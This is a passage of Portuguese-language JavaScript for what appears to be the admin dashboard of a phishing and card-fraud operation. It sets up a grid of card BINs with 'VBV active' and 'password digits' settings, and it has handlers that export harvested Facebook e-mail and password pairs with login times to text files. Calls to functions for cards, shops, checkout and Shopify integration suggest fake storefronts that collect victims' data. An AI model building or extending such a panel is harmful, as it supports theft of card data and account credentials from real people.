                        groupremovestring: "Remover do agrupamento",
                        filterclearstring: "Limpar",
                        filterstring: "Filtrar",
                        filtershowrowstring: "Mostrar linhas onde:",
                        filtershowrowdatestring:
                            "Mostrar itens com data no intervalo:",
                        filterorconditionstring: "Ou",
                        filterandconditionstring: "E",
                        filterselectallstring: "(Selecionar Todos)",
                        filterchoosestring: "Por favor, escolha:",
                        filterstringcomparisonoperators: [
                            "vazio",
                            "não vazio",
                            "contém",
                            "contém (caso sens.)",
                            "não contém",
                            "não contém (caso sens.)",
                            "começa com",
                            "começa com (caso sens.)",
                            "termina com",
                            "termina com (caso sens.)",
                            "igual",
                            "igual (caso sens.)",
                            "não igual",
                            "não igual (caso sens.)",
                        ],
                        filternumericcomparisonoperators: [
                            "igual",
                            "não igual",
                            "menor que",
                            "menor ou igual a",
                            "maior que",
                            "maior ou igual a",
                        ],
                        filterdatecomparisonoperators: [
                            "igual",
                            "não igual",
                            "menor que",
                            "menor ou igual a",
                            "maior que",
                            "maior ou igual a",
                        ],
                        filterbooleancomparisonoperators: [
                            "igual",
                            "não igual",
                        ],
                        validationstring: "Valor inserido não é válido",
                        emptydatastring: "Não há dados a serem exibidos",
                        filterselectstring: "Selecione Filtro",
                        filterchoosestring: "Por favor, escolha:",
                        loadtext: "Carregando...",
                        clearstring: "Limpar",
                        todaystring: "Hoje",
                        continuelabelstring: "Continuar...",
                        continuetextstring: "Continuar...",
                        loadtext: "Carregando...",
                        okstring: "OK",
                        cancelstring: "Cancelar",
                        emptydatastring: "Não encontrado",
                        filterselectstring: "Selecione Filtro",
                        todaystring: "Hoje",
                        clearstring: "Limpar",
                        sortascendingstring: "Ordenar crescente",
                        sortdescendingstring: "Ordenar decrescente",
                        sortremovestring: "Remover ordenação",
                        firstDay: 0,
                        days: {
                            // full day names
                            sun: "Domingo",
                            mon: "Segunda",
                            tue: "Terça",
                            wed: "Quarta",
                            thu: "Quinta",
                            fri: "Sexta",
                            sat: "Sábado",
                            // abbreviated day names
                            sun: "Dom",
                            mon: "Seg",
                            tue: "Ter",
                            wed: "Qua",
                            thu: "Qui",
                            fri: "Sex",
                            sat: "Sáb",
                        },
                        months: {
                            // full month names
                            january: "Janeiro",
                            february: "Fevereiro",
                            march: "Março",
                            april: "Abril",
                            may: "Maio",
                            june: "Junho",
                            july: "Julho",
                            august: "Agosto",
                            september: "Setembro",
                            october: "Outubro",
                            november: "Novembro",
                            december: "Dezembro",
                            // abbreviated month names
                            january: "Jan",
                            february: "Fev",
                            march: "Mar",
                            april: "Abr",
                            may: "Mai",
                            june: "Jun",
                            july: "Jul",
                            august: "Ago",
                            september: "Set",
                            october: "Out",
                            november: "Nov",
                            december: "Dez",
                        },
                        year: "Ano",
                        era: "Era",
                        hour: "Hora",
                        minute: "Minuto",
                        second: "Segundo",
                        day: "Dia",
                        date: "Data",
                        time: "Tempo",
                        headeritems: {
                            columnchooser: "Escolher colunas",
                            filterclearstring: "Limpar",
                            filterstring: "Filtrar",
                            filtershowrowstring: "Mostrar linhas onde:",
                        },
                    };
                    return localizationobj;
                };

                $("#grid_bins").jqxGrid({
                    source: dataAdapter,
                    statusbarheight: 45,
                    localization: getLocalization(),
                    selectionmode: "singlerow",
                    sortable: true,
                    filterable: true,
                    pageable: true,
                    columnsmenu: false,
                    showfilterrow: true,
                    showaggregates: true,
                    showstatusbar: true,
                    statusbarheight: 25,
                    editable: true,
                    width: "100%",
                    height: "100%",
                    theme: "fluent",
                    columns: [
                        {
                            text: "BIN",
                            datafield: "bin",
                            hidden: false,
                            editable: false,
                            width: "15%",
                            align: "center",
                            cellsalign: "center",
                        },
                        {
                            text: "Banco",
                            datafield: "banco",
                            width: "30%",
                            editable: false,
                            align: "center",
                            cellsalign: "center",
                        },
                        {
                            text: "Tipo",
                            datafield: "type",
                            width: "15%",
                            editable: false,
                            align: "center",
                            cellsalign: "center",
                        },
                        {
                            text: "Level",
                            datafield: "lvl",
                            width: "15%",
                            editable: false,
                            align: "center",
                            cellsalign: "center",
                        },
                        {
                            text: "VBV Ativo",
                            datafield: "vbv",
                            width: "10%",
                            columntype: "checkbox",
                            align: "center",
                            cellsalign: "center",
                        },
                        {
                            text: "Dígitos Senha",
                            datafield: "digitos",
                            width: "15%",
                            align: "center",
                            cellsalign: "center",
                        },
                    ],
                });

                $("#grid_bins").on("cellendedit", async function (event) {
                    const usuario = _global.getUsuario();
                    var args = event.args;
                    var dataField = event.args.datafield;
                    var rowBoundIndex = event.args.rowindex;
                    var value = args.value;
                    var oldvalue = args.oldvalue;
                    var rowData = args.row;

                    console.log(dataField, value, oldvalue);

                    if (oldvalue == value) return;

                    if (dataField == "vbv") {
                        let dados = await _global.busca(
                            "dashboard/updateBinsUser",
                            {
                                u: usuario.id_usuario,
                                digitos: rowData.digitos,
                                vbv: value ? "s" : "n",
                                bin: rowData.bin,
                            },
                            "POST"
                        );

                        if (dados.status == 200)
                            _global.toast(
                                "O VBV foi" +
                                    (value ? " ativado " : " desativado ") +
                                    " para esta BIN.",
                                "toastsucesso"
                            );
                        if (dados.status == 500)
                            _global.toast(
                                "Não foi possível salvar [ERRO INTERNO].",
                                "toasterro"
                            );
                    }

                    if (dataField == "digitos") {
                        if (value < 4 || value > 10) {
                            _global.toast(
                                "Os dígitos permitidos vão do 4 até 8.",
                                "toasterro"
                            );
                            return;
                        }

                        let dados = await _global.busca(
                            "dashboard/updateBinsUser",
                            {
                                u: usuario.id_usuario,
                                digitos: value,
                                vbv: rowData.vbv ? "s" : "n",
                                bin: rowData.bin,
                            },
                            "POST"
                        );

                        if (dados.status == 200)
                            _global.toast(
                                "Os dígitos foram atualizados com sucesso para esta BIN.",
                                "toastsucesso"
                            );
                        if (dados.status == 500)
                            _global.toast(
                                "Não foi possível salvar [ERRO INTERNO].",
                                "toasterro"
                            );
                    }
                });

                res();
            });
        },
        async exportaFacebook() {
            $("#btnexportafacebookhj")
                .off("click")
                .on("click", async function (e) {
                    const usuario = _global.getUsuario();
                    $(this).prop("disabled", true);
                    let dados = await _global.busca(
                        "dashboard/getFacebooks",
                        { u: usuario.id_usuario, periodo: "hoje" },
                        "POST"
                    );
                    if (dados.length < 1) {
                        _global.toast(
                            "Você não tem facebooks para exportar.",
                            "toasterro"
                        );
                        $(this).prop("disabled", false);
                        return;
                    }

                    string = "";

                    dados.forEach((v, i) => {
                        string += `
                    ------------------
                    E-mail: ${v.email}
                    Senha: ${v.senha}
                    Horário de Login: ${v.hr}
                    `;
                    });
                    _global.exportarParaTxt(string);
                    $(this).prop("disabled", false);
                });

            $("#btnexportafacebook")
                .off("click")
                .on("click", async function (e) {
                    const usuario = _global.getUsuario();
                    $(this).prop("disabled", true);
                    let dados = await _global.busca(
                        "dashboard/getFacebooks",
                        { u: usuario.id_usuario, periodo: "total" },
                        "POST"
                    );
                    if (dados.length < 1) {
                        _global.toast(
                            "Você não tem facebooks para exportar.",
                            "toasterro"
                        );
                        $(this).prop("disabled", false);
                        return;
                    }

                    string = "";

                    dados.forEach((v, i) => {
                        string += `
                    ------------------
                    E-mail: ${v.email}
                    Senha: ${v.senha}
                    Horário de Login: ${v.hr}
                    `;
                    });
                    _global.exportarParaTxt(string);
                    $(this).prop("disabled", false);
                });

            $("#deletafacebook")
                .off("click")
                .on("click", async function (e) {
                    const usuario = _global.getUsuario();
                    $(this).prop("disabled", true);
                    let asd = confirm(
                        "Você deseja realmente apagar todos os facebooks?"
                    );
                    if (!asd) return;

                    let dados = await _global.busca(
                        "dashboard/getFacebooks",
                        { u: usuario.id_usuario, periodo: "delete" },
                        "POST"
                    );
                    if (dados.status == 200)
                        _global.toast(
                            "Os facebooks foram deletados com sucesso.",
                            "toastsucesso"
                        );
                    else
                        _global.toast(
                            "Não foi possível deletar. [ERRO INTERNO]",
                            "toasterro"
                        );

                    $(this).prop("disabled", false);
                });
        },
    };

    const init = () => {
        _global.usuario().then(() => {
            _global.trocaAba();
            _global.selects().then(() => {
                _global.verificaSessao().then(() => {
                    _global.trocaAbaModalLoja();
                    _global.minhasLojas();
                    _global.adicionaLoja();
                    _global.adicionarDominio();
                    _global.abaCheckout();
                    _global.alteraCorTema();
                    _global.btnDashboardUsuarios();
                    _global.getCards();
                    _global.getCardsPerfil();
                    _global.monitoraOnline();
                    _global.resetaEstatisticas();
                    _global.configWhatsapp();
                    _global.getLojasEmail();
                    _global.eventosSmtp();
                    _global.eventoDataPedidos();
                    _global.integracaoShopify();
                    _global.exportaPedidosTxt();
                    _global.binsCartoes();
                    _global.exportaFacebook();
                    window.alterarSenha = _global.alterarSenha;
                });
            });
        });

        setInterval(() => {
            _global.verificaSessao();
        }, 900000);
    };

    init();

    //pagSheild integration ui modification
    $("body").on("change", "#banco_responsavel", function () {
        const commonInput = $("#chave-pix-2024");
        const nonPagshieldDiv = $("#div_non_pagshield");
        const pagshieldDiv = $("#div_pagshield");

        if ($(this).val() === "pagShield") {
            commonInput.text("Secret Key");
            nonPagshieldDiv.hide();
            pagshieldDiv.removeClass("d-none");
        } else {
            commonInput.text("Chave pix");
            nonPagshieldDiv.show();
            pagshieldDiv.addClass("d-none");
        }
    });
});
